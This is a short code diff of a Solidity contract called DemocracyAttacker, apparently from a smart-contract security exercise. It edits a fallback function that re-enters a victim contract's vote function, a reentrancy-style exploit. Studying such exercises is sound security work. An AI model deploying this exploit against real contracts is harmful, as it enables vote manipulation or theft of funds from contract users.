@@ -9,15 +9,16 @@ contract DemocracyAttacker {
 
     constructor(address addr) payable {
         victim = Democracy(addr);
-        victim.mint{value: msg.value}(address(this), 22);
+        // victim.mint{value: msg.value}(address(this), 22);
     }
 
     function attack() external {
-        // count++;
+        console.log("attack....");
         victim.vote(address(0));
     }
 
-    receive() external payable {
+    fallback() external payable {
+        console.log("fallback....");
         victim.vote(address(0));
     }
 }
